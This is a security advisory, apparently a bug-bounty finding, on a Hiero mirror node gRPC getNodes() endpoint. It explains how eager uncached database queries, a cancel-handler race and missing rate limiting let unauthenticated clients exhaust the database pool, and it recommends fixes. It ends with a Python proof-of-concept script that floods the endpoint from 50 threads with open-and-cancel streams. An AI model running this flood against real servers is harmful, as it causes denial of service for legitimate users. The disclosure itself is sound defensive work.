### Title
Unauthenticated gRPC `getNodes()` Stream Churn Causes Resource Exhaustion via Eager DB Queries and Cancel-Handler Race Condition

### Summary
The `getNodes()` handler in `NetworkController` creates a reactive subscription that eagerly executes uncached database queries before the cancel handler is registered, with no authentication or rate limiting on the gRPC endpoint. An unprivileged attacker can open many connections and rapidly cycle open/cancel calls to exhaust the database connection pool and server thread resources. A race condition between `subscribe()` and `setOnCancelHandler()` can additionally leave subscriptions running after client disconnection.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java`, lines 33–43:

```java

        .flatMapMany(networkService::getNodes)          // line 35 — triggers eager DB queries on subscribe
        .map(this::toNodeAddress)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(...);                                 // line 38 — subscription starts HERE

if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
    serverCallStreamObserver.setOnCancelHandler(disposable::dispose);  // line 41 — cancel handler set AFTER subscribe
```

**Root cause and failed assumptions:**

1. **Eager uncached DB queries**: `addressBookRepository.findLatestTimestamp()` and `nodeStakeRepository.findLatestTimestamp()` are executed synchronously inside `getNodes()` — outside any `Flux.defer()` — meaning they run on every call regardless of cancellation. Neither is annotated with `@Cacheable`. Only `findAllStakeByConsensusTimestamp` is cached.

2. **Race condition**: `subscribe()` (line 38) starts the reactive pipeline before `setOnCancelHandler()` (line 41) is registered. If the client sends a gRPC cancel signal in the window between these two lines, the cancel handler is never set, and the subscription continues executing — including paging DB queries inside `page()` via `Schedulers.boundedElastic()` — with no cleanup path.

3. **No rate limiting on gRPC**: The throttling infrastructure (`ThrottleManagerImpl`, `ThrottleConfiguration`) exists only in the `web3` module. The gRPC module has no per-request, per-IP, or global call-rate limiting. The only protection is `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, line 14), which is per-connection and trivially bypassed by opening many connections.

4. **No authentication**: The endpoint is publicly accessible with no credential check.

### Impact Explanation

Each `getNodes()` call unconditionally issues at least 2 SQL queries against the database (`select max(...)` on `address_book` and `node_stake`). Under rapid churn from many connections, this exhausts the database connection pool, causing all gRPC and potentially other services sharing the same pool to stall or fail. Leaked subscriptions (from the race condition) additionally consume `boundedElastic` scheduler threads and hold open DB transactions via `transactionOperations.execute()` in `page()`, amplifying the impact. The result is full denial of service of the gRPC API for legitimate users.

### Likelihood Explanation

No privileges, credentials, or special knowledge are required. Any client with network access to port 5600 can exploit this using standard gRPC tooling (e.g., `grpcurl`, a custom gRPC client). The attack is trivially scriptable: open N connections, issue 5 concurrent `getNodes()` calls per connection, immediately cancel, repeat. The race condition window is small but reproducible at high request rates. This is a realistic, low-skill attack.

### Recommendation

1. **Cache the timestamp lookups**: Annotate `AddressBookRepository.findLatestTimestamp()` and `NodeStakeRepository.findLatestTimestamp()` with `@Cacheable` (short TTL, e.g., 2–5 seconds) to eliminate per-call DB queries.

2. **Fix the cancel-handler race**: Register the cancel handler before subscribing, or use `Mono.fromCallable(...).flatMapMany(...).subscribe(...)` inside a `Flux.create()` or use `DisposableSubscriber` with pre-registration.

3. **Add gRPC-level rate limiting**: Implement a `ServerInterceptor` that applies token-bucket rate limiting per IP or globally for `getNodes()` calls, analogous to the `ThrottleManagerImpl` in the web3 module.

4. **Add global connection limits**: Configure `NettyServerBuilder.maxConnectionAge()`, `maxConnectionIdle()`, and a global `maxConcurrentCallsPerConnection` that accounts for total connections, not just per-connection.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from com.hedera.mirror.api.proto import mirror_network_service_pb2 as pb

def flood():
    for _ in range(10000):
        channel = grpc.insecure_channel('mirror-node-grpc:5600')
        stub = network_service_pb2_grpc.NetworkServiceStub(channel)
        # Open stream
        call = stub.getNodes(pb.AddressBookQuery(limit=1))
        # Immediately cancel — triggers setOnCancelHandler path
        # Race: if cancel arrives before handler is set, subscription leaks
        call.cancel()
        channel.close()

# Launch many concurrent threads to exhaust DB connection pool
threads = [threading.Thread(target=flood) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# Expected result: DB connection pool exhausted, subsequent legitimate
# getNodes() calls hang or fail with UNAVAILABLE
```
